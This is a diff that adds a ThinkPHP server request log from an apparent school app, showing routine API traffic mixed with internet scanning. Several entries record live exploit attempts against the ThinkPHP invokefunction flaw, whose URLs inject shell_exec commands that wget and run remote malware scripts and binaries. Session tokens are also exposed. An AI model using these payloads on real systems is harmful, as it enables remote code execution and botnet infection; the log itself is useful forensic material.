@@ -1,0 +1,1560 @@
+---------------------------------------------------------------
+[ 2019-02-03T00:32:43+08:00 ] 89.144.151.49 GET 148.70.73.177:80/
+[运行时间：0.011775s] [吞吐率：84.93req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T00:32:43+08:00 ] 89.144.151.49 GET 148.70.73.177:80/
+[运行时间：0.011708s] [吞吐率：85.41req/s] [内存消耗：1,243.09kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T00:32:43+08:00 ] 89.144.151.49 GET 148.70.73.177:80/
+[运行时间：0.010890s] [吞吐率：91.83req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T00:32:44+08:00 ] 89.144.151.49 GET 148.70.73.177:80/
+[运行时间：0.011145s] [吞吐率：89.73req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T00:41:43+08:00 ] 18.210.15.180 GET 148.70.73.177/
+[运行时间：0.011749s] [吞吐率：85.11req/s] [内存消耗：1,243.55kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/59.0.3088.63 Safari/537.32',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T01:20:21+08:00 ] 185.244.25.128 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+[运行时间：0.014648s] [吞吐率：68.27req/s] [内存消耗：1,366.60kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget http://infinityondemand.club/bins/infinity.sh; chmod  x infinity.sh; sh infinity.sh ',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T01:38:03+08:00 ] 179.97.149.54 GET 148.70.73.177:80/
+[运行时间：0.029938s] [吞吐率：33.40req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T01:53:40+08:00 ] 185.172.110.88 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/Corona.x86_64;%20chmod%20777%20Corona.x86_64;./Corona.x86_64%20thinkphp
+[运行时间：0.017202s] [吞吐率：58.13req/s] [内存消耗：1,366.54kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget http://185.244.25.159/Corona.x86_64; chmod 777 Corona.x86_64;./Corona.x86_64 thinkphp',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T02:11:51+08:00 ] 60.191.52.254 HEAD 112.124.42.80:63435/
+[运行时间：0.012275s] [吞吐率：81.47req/s] [内存消耗：1,243.60kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'proxy-connection' => 'keep-alive',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => '112.124.42.80:63435',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T03:33:52+08:00 ] 14.17.21.58 GET 148.70.73.177/webdav
+[运行时间：0.025200s] [吞吐率：39.68req/s] [内存消耗：1,368.81kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'webdav',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T03:34:49+08:00 ] 14.17.3.65 GET 148.70.73.177/manager/html
+[运行时间：0.013890s] [吞吐率：71.99req/s] [内存消耗：1,368.91kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'manager',
+    1 => 'html',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T04:23:25+08:00 ] 58.251.121.186 GET 148.70.73.177/index.php
+[运行时间：0.014213s] [吞吐率：70.36req/s] [内存消耗：1,245.49kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T06:03:20+08:00 ] 189.141.219.60 GET 148.70.73.177:80/
+[运行时间：0.015682s] [吞吐率：63.77req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T07:02:17+08:00 ] 197.159.216.218 GET 148.70.73.177:80/
+[运行时间：0.016230s] [吞吐率：61.61req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T07:34:58+08:00 ] 185.244.25.128 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+[运行时间：0.026641s] [吞吐率：37.54req/s] [内存消耗：1,366.60kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget http://infinityondemand.club/bins/infinity.sh; chmod  x infinity.sh; sh infinity.sh ',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T07:42:37+08:00 ] 101.226.114.193 GET 148.70.73.177/webdav
+[运行时间：0.013634s] [吞吐率：73.35req/s] [内存消耗：1,368.81kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'webdav',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T07:56:45+08:00 ] 62.173.140.122 GET 148.70.73.177/devicecfg//polycom/000000000000.cfg
+[运行时间：0.016985s] [吞吐率：58.87req/s] [内存消耗：1,365.29kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'devicecfg',
+    1 => 'polycom',
+    2 => '000000000000.cfg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T08:58:11+08:00 ] 62.210.78.33 GET 148.70.73.177/
+[运行时间：0.014526s] [吞吐率：68.84req/s] [内存消耗：1,242.98kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T11:43:42+08:00 ] 187.108.241.248 GET 148.70.73.177:80/
+[运行时间：0.012651s] [吞吐率：79.05req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T12:24:31+08:00 ] 14.17.3.65 GET 148.70.73.177/webdav
+[运行时间：0.012158s] [吞吐率：82.25req/s] [内存消耗：1,368.81kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'webdav',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '148.70.73.177',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T12:30:58+08:00 ] 152.249.172.235 GET 148.70.73.177:80/
+[运行时间：0.017929s] [吞吐率：55.78req/s] [内存消耗：1,242.96kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'host' => '148.70.73.177:80',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T12:42:57+08:00 ] 62.210.78.33 GET 148.70.73.177/
+[运行时间：0.014498s] [吞吐率：68.98req/s] [内存消耗：1,242.98kb] [文件加载：33]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T12:57:32+08:00 ] 60.255.76.130 POST 148.70.73.177/api/banner/showBanner
+[运行时间：0.304465s] [吞吐率：3.28req/s] [内存消耗：2,736.30kb] [文件加载：55]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'banner',
+    2 => 'showBanner',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '63',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'number' => '-1',
+  'type' => '1',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+  'user_id' => '33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.103386s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.016214s ]
+[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 1  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.000500s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:37+08:00 ] 60.255.76.130 POST 148.70.73.177/api/trips/showTrips
+[运行时间：0.065839s] [吞吐率：15.19req/s] [内存消耗：2,765.95kb] [文件加载：55]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'trips',
+    2 => 'showTrips',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '72',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'times' => '1549169857',
+  'number' => '2',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Trips->showTrips[ /data/web/php/ischool/application/api/controller/Trips.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008372s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `tasks` [ RunTime:0.000705s ]
+[ sql ] [ SQL ] SELECT t.id tasks_id,`t`.`type`,`t`.`ctime`,`t`.`content`,`t`.`start_time`,`t`.`end_time`,`t`.`title`,`t`.`plays_id` FROM `tasks` `t` WHERE  ( `t`.`start_time` > 1549123200 AND `t`.`start_time` < 1549209599 )  AND `t`.`user_id` = '33'  AND `t`.`status` = 0 ORDER BY `t`.`start_time` DESC LIMIT 0,2 [ RunTime:0.000442s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:37+08:00 ] 60.255.76.130 POST 148.70.73.177/api/trips/showList
+[运行时间：0.038291s] [吞吐率：26.12req/s] [内存消耗：2,766.07kb] [文件加载：55]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'trips',
+    2 => 'showList',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '54',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'pages' => '1',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Trips->showList[ /data/web/php/ischool/application/api/controller/Trips.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004267s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `tasks` [ RunTime:0.000590s ]
+[ sql ] [ SQL ] SELECT t.id tasks_id,`t`.`type`,`t`.`ctime`,`t`.`content`,`t`.`start_time`,`t`.`end_time`,`t`.`title`,`t`.`plays_id`,`t`.`type_name` FROM `tasks` `t` WHERE  `t`.`start_time` > 1549209599  AND `t`.`user_id` = '33'  AND `t`.`status` = 0 ORDER BY `t`.`start_time` DESC LIMIT 0,10 [ RunTime:0.000307s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:42+08:00 ] 60.255.76.130 POST 148.70.73.177/api/banner/showBanner
+[运行时间：0.048801s] [吞吐率：20.49req/s] [内存消耗：2,736.14kb] [文件加载：55]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'banner',
+    2 => 'showBanner',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '63',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'number' => '-1',
+  'type' => '2',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+  'user_id' => '33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.015155s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.000983s ]
+[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 2  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.000501s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:42+08:00 ] 60.255.76.130 POST 148.70.73.177/api/sociality/serveObtain
+[运行时间：0.058974s] [吞吐率：16.96req/s] [内存消耗：2,630.89kb] [文件加载：54]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sociality',
+    2 => 'serveObtain',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
